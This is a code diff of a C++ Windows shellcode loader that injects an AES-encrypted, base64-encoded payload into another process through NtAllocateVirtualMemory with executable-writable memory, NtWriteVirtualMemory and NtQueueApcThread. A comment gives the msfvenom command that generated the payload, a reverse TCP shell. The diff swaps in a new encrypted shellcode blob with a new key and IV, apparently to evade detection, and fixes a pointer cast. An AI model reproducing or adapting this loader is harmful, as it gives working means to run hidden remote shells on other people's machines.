@@ -77,7 +77,7 @@ VOID hollow(std::vector<byte> payload)
 
     mem = nullptr;
     SIZE_T p_size = payload.size();
-    NtAllocateVirtualMemory(hProcess, &mem, 0, (PULONG)&p_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    NtAllocateVirtualMemory(hProcess, &mem, 0, (PSIZE_T)&p_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     NtWriteVirtualMemory(hProcess, mem, payload.data(), payload.size(), 0);
     NtQueueApcThread(hThread, (PKNORMAL_ROUTINE)mem, mem, NULL, NULL);
     NtResumeThread(hThread, NULL);
@@ -105,15 +105,15 @@ int main()
 
     // Decode shellcode and load into uint8_t vector for decryption
     // msfvenom -p windows/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=443 -f raw >> 64b_443_localhost_revshell.bin
-    shellcode = "+R1SJjLLLLZxU7aVqyWuQTHkgmq8rINN1WT7jQTgRFDmWGCNTMf2cn+Vy9hV9y1BSQa+1xLNOBmkodx9Scx5wD+ljpuciiJ7aygUK3waZLblMTC5dUgZsUocxYo8sg4B76KumKv2D+iGbPHboRIF4zs56kc2ya4ZgIfh/PJuSv4zIJ4qrClS1uGUt1h4L7j6G46TbEuciRO6mUEonYgbM0jYhsCNdStZYOfw5WCBWr6g/ipPlPibWA40fVLP/RKRKX5QKf8553CJuRbWF+m0RYeuhF+YkMTscmJUuoLC+S7Iow1B7Ui/Ehs82uN5+ie2Mjd3WDCF09hLvUfwTj73zh4FTCNQVtv1YTHYyjcVI3eOzWMrKAH+QTFtE9Nbp/5LFqRwKTvLpIBIQIq7s+qMyvBOFHUNEeMDhKvfRTLriS/vTXAbXNItnqd5vYutk3xlDTr3ULQir8r/G2GLPY/wTLZLM9l/KXdLBAMEVW3AXNUNwwW/T1lHt4OdwtyhrAgfBOVl4QBj03cQV3WzHYliwko9ustTQxcKz2gA/GwwAUSCrEv5OQcNYNLo6r20JZbaLAaEWfpVSpDGzjBZ6bsIXZjZslUgWQA0VYAxHUFgc6U8SYYIs5zU3+LfRjgxpjSRvn41POSkbw6f4xazUNge/yVWGI8fBbovyKv9tK0cbRCDpAbHkh4O1JqlU/P9Jxd4wDYeHPEZFjSfEoTUbWlCMqF3ADVWB5QDrlNIZoQF/4zqQJ6hyILe0oMfEXNgTTW/W5BAC03q8012/+BmakajaWEtDxo6QukaMIntXpPjFWzg19mUxfQFyUnsr91igW/vl2brVOAYlbBJ9E7JN6A6q8rwF4x22L+q3Dl2UCL8f0dDaXwyXu3Omu3Q05Cn/KocoA+Dl6aZ0xTl7zpZ/qBSTveR60WR451JqyOsCsI2ArKIJZk82puv9d8ilHshUAu6SUoSyLMb8R5ZPmJya9942cbLT4LKIaL43rndZWu086Ux/jt8Z0C3vwt/bBu8uP6ML4bAOpQCI77RkGZhGa/3owBpr7GuuD/HgwrH9yhQ5xS+wasEHTOKrqLoAImA/s9R5+9GOmeUkUjOCFcdr8+upKmJQFNJf2DlsMKLeAv4b1A+CcyelTIzbicJQUnQdVR35WFt3DhvWqvQa+gMkt2eLoctaLF31eZouQqh6ZPBkkU/eoJ6/0nXHz9KI1YjfN8anXjythb2SXNvbRDG7eCjCw==";
+    shellcode = "5WJDDSbb0Kh7+npFtMpwoO6jJwQ6LKvoys6rZ9I+LFIfr6sCjINscuKryZ3q7PKKSkEwiF2DQQYDYJyNGP+LCc3xF3RIlCrrM5TPrze2E64GKNJwmmLLpvGGAM6B0xrp3OARcAgXzksNxR2mmXx1CFgJfc+pe0xsUQylgSEW9lmZsjifE87bs9XEz45SwmBKAJyR3UE0PZyjsr/FqWmZN0W0sLWsiQPo618CepCkfq5ZVF/V2iUR6+y7XQPlz2WfprshOaGqv48o6AKVMwLAyJ6iqVq2X8LzagEdGLzOUVXkJAgzntp0e7C9IgxW8O1THI0dB9GDjsn+tS1gitYLJ+7lUEYBVnrjCWB2IaQdDiRJ+5ZK/R8F6whOITEf+VpB/EJ1DofH56MDbGo+WkDzsdHnG2drtiYTXXdweqGiJzCBwYNjzGB2s4xW8JfKWjBvDerO22TBbpp21/AJDtHt/eaLXmzjsVxPT5GNF2lZkQf04VQVpoFKV1VvSPEhFVeT1vRN+f6e6XCiMSU8ziPbl9B5kgYrRq51TOD4zmuOysGa4Klt51nnmyxFsq/4Xx4kOioZTf2/oJ7X7UUVFaM0YqwHht5Vaf6RmnGVwwooxAnqx2MdnJTx2dhoCk3MxVMTDtt7sdwiAYIM4Ekr4rXRntmCHebl17bbVdqBdTZM/u9Ggh7le4gemOdT4ag2WRhEVTbbiTRCsarVmIPWeB17p5qzw0XbyweWNl/kOJZsaaHKOnR3Zy0mG9a8SORmJTs/E7nPpb5gVFiaSdwDPs3qRklNbZwd+QbL6LJdCZsDMuY69z93X2gyHc60yVpcJTGd07iqwotmCIf80AlcpjjrkiTy5xwT7s62dE7Gs/ZphRuRHHS9UCLwqC85dBY08fqalmvoC59EdwXw8y+YFD2kC3vDtELY0hM4kZ+669al0XytP+22ju3mbmA2agv4Axr7xUo8eXxVA1Ov6exWymhnq92CqhGbh7tFcL9Zcq2431M5K2k3ZmGUVxiHZRyfOZv6ZopIrp81P6jtUNkQN9Ud51HMuh4iVrZsbMZ+Bo6W506roPSQCIYZUiz7rOq4Ai+omnaY+5+sRZ+QllV8t6cZhY+vipbX6+p+QMzhGYLDFJJKK6Zql3Zo49EZetF3rgItGea/d5QTYwCATPjrMeHjvSkapak7ifC54+hWLvq9QDukoWaT+3BirHHDZHvhlguVpk+MwENoLACsZiJ/sH9ylA==";
     decoded = b64.base64_decode(shellcode);
     ciphertext.clear();
     std::copy(decoded.begin(), decoded.end(), std::back_inserter(ciphertext));
 
     // AES Decryption Objects
     struct AES_ctx e_ctx;
-    uint8_t key[32] = {0x5f,0x72,0x19,0x5f,0xb1,0xe7,0xc5,0xc1,0x8f,0x45,0xaa,0x53,0x0f,0x4b,0x55,0xeb,0xb1,0xd3,0x31,0x08,0x60,0x87,0x35,0x73,0xe1,0x40,0x2e,0x9a,0xd9,0xe8,0x06,0xb7};
-    uint8_t iv[16] = {0x16,0xd3,0xc3,0x4b,0x11,0xe5,0x46,0x99,0x58,0xef,0xec,0xd8,0xf5,0xa6,0x0d,0xbc};
+    uint8_t key[32] = {0x9e,0x91,0x45,0x7a,0xa1,0x32,0xe1,0x09,0x16,0xb2,0x09,0xee,0xff,0x6f,0x7a,0x44,0xfd,0xd8,0x12,0x90,0xd7,0xd0,0xdf,0x39,0x0a,0x46,0x7b,0x9a,0x52,0xe8,0x2e,0xd6};
+    uint8_t iv[16] = {0xdb,0x03,0xef,0xe3,0xcf,0xb6,0x5a,0x33,0xe2,0x6b,0x41,0x51,0xc2,0xd2,0xb4,0x46};
     
     AES_init_ctx_iv(&e_ctx, key, iv);
 
